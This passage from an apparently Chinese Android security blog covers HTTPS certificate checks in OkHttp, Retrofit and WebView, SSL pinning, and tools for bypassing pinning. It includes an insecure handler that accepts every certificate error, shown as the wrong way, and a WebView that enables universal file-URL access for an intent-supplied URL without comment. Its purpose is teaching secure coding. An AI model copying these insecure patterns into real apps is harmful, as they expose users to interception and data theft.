使用webpy搭建服务器，代码详见demo（webpytest2.py）实例参见咪咕TV（miguTV_3.3.0.apk） 自签名证书Retrofit+OkHttp进行证书校验，而OkHttp证书校验上文已经介绍。 1234567OkHttpClient client = new OkHttpClient.Builder() .sslSocketFactory(HTTPSUtils.getSSLSocketFactory(context)) .hostnameVerifier(HTTPSUtils.getHostNameVerifier(hostUrls)) .build();Retrofit retrofit = new Retrofit.Builder().baseUrl(baseUrl) .client(client) .build(); 0x05 WebView发送请求通过Intent启动webview 123Uri uri = Uri.parse(url); Intent intent = new Intent(Intent.ACTION_VIEW,uri); startActivity(intent); 创建布局 12345&lt;WebView android:id="@+id/webView" android:layout_width="match_parent" android:layout_height="wrap_content"&gt; &lt;/WebView&gt; 使用webview加载页面 1234webView = (WebView) findViewById(R.id.webView1); webView.getSettings().setAllowUniversalAccessFromFileURLs(true);String url = getIntent().getData().toString();webView.loadUrl(url);webView.setWebViewClient(new WebViewClient()); 自签名证书ca 认证的证书，在 WebView 则可以直接显示出来，不需要特殊处理。服务端采用的是可信CA颁发的证书，需要在webView.setWebViewClient(webviewClient)时重载WebViewClient的onReceivedSslError()。 错误的做法： 1234@Overridepublic void onReceivedSslError(WebView view, SslErrorHandler handler, SslError error) &#123; handler.proceed();&#125; 正确写法： 1.安全级别较低的方案：证书出现问题，可以提示用户风险，让用户选择加载与否 123456789101112131415161718192021222324252627282930313233343536373839404142434445webView.setWebViewClient(new WebViewClient() &#123; @Override public void onReceivedSslError(WebView view, final SslErrorHandler handler, SslError error) &#123; final AlertDialog.Builder builder = new AlertDialog.Builder(WebviewActivity.this); SslCertificate sslCertificate = error.getCertificate(); switch (error.getPrimaryError()) &#123; case SslError.SSL_DATE_INVALID: Log.i("lzm", SslError.SSL_DATE_INVALID + " ssl date invalid"); break; case SslError.SSL_IDMISMATCH: Log.i("lzm", SslError.SSL_IDMISMATCH + " hostname dismatch"); break; case SslError.SSL_EXPIRED: Log.i("lzm", SslError.SSL_EXPIRED + " cert has expired"); break; case SslError.SSL_UNTRUSTED: Log.i("lzm", SslError.SSL_UNTRUSTED + " cert is not trusted"); break; case SslError.SSL_INVALID: Log.i("lzm", SslError.SSL_INVALID + " cert is invalid"); break; case SslError.SSL_NOTYETVALID: Log.i("lzm", SslError.SSL_NOTYETVALID + " cert is not yet valid"); break; &#125; builder.setTitle("ssl error"); builder.setMessage("ssl error code: " + error.getPrimaryError()); builder.setPositiveButton("proceed", new DialogInterface.OnClickListener() &#123; @Override public void onClick(DialogInterface dialogInterface, int i) &#123; handler.proceed(); &#125; &#125;); builder.setNegativeButton("cancel", new DialogInterface.OnClickListener() &#123; @Override public void onClick(DialogInterface dialogInterface, int i) &#123; handler.cancel(); &#125; &#125;); final AlertDialog dialog = builder.create(); dialog.show(); &#125;&#125;); 2.安全的方案是当出现了证书问题的时候，读取本地保存的的根证书，然后与服务器校验，通过则继续执行handler.proceed()，否则执行 handler.cancel()。 1234567891011121314151617181920212223242526272829303132333435363738webView.setWebViewClient(new WebViewClient() &#123; @Override public void onReceivedSslError(WebView view, final SslErrorHandler handler, SslError error) &#123; checkCAweb(handler, view.getUrl()); &#125; &#125;);private void checkCAweb(final SslErrorHandler handler, String url) &#123; OkHttpClient.Builder builder = setCer(new OkHttpClient.Builder()); Request request = new Request.Builder().url(url).build(); builder.build().newCall(request).enqueue(new Callback() &#123; @Override public void onFailure(Call call, IOException e) &#123; Log.i("lzmtest", e.getMessage()); handler.cancel(); &#125; @Override public void onResponse(Call call, Response response) throws IOException &#123; Log.i("lzmtest", response.body().string()); handler.proceed(); &#125; &#125;);&#125;private OkHttpClient.Builder setCer(OkHttpClient.Builder client) &#123; try &#123; SSLContext sslContext = SSLContext.getInstance("TLS"); // 正确实现服务器证书校验 trustCert，见上文 sslContext.init(null, trustCert, new SecureRandom()); client.sslSocketFactory(sslContext.getSocketFactory()); // 正确实现域名校验 verify，见上文 client.hostnameVerifier(new MyHostnameVerifier()); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; return client;&#125; 具体程序见demo (webviewtest.apk) SSL PinningAndroid-SSL-Pinning-WebViews 基本实现和上文保持一致：初始化keyStore，将可信证书（本地or硬编码）加入keyStore，在TrustManagerFactory中初始化keyStore，设置SSLcontext，用TrustManager初始化。使用网络请求框架（HttpURLConnect，OkHttp等）设置SocketFactory，setSSLSocketFactory(sslContext.getSocketFactory())。 0x06 小结建议开发或对https方面不了解的安全测试同学查看android开发指南之通过HTTPS 和 SSL确保安全。正确实现https也可通过Hook方式绕过，android下常用的有Xposed工具： JustTrustMe SSLUnpinning 及Frida工具： objection frida-android-repinning 想保证通信安全，敏感信息还应该做二次加密，接口做签名，客户端本身防Hook等。 参考[1]https://developer.android.com/training/articles/security-ssl.html[2]https://www.cnblogs.com/liyiran/p/7011317.html[3]https://jaq.alibaba.com/community/art/show?articleid=545[4]http://liuwangshu.cn/tags/Android%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/[5]https://blog.csdn.net/sbsujjbcy/article/details/45568053[6]http://find-sec-bugs.github.io/bugs.htm[7]https://blog.it-securityguard.com/the-stony-path-of-android-%F0%9F%A4%96-bug-bounty-bypassing-certificate-pinning/]]></content>
      <categories>
        <category>android网络</category>
      </categories>
      <tags>
        <tag>https</tag>
        <tag>sslpinning</tag>
      </tags>
  </entry>
</search>
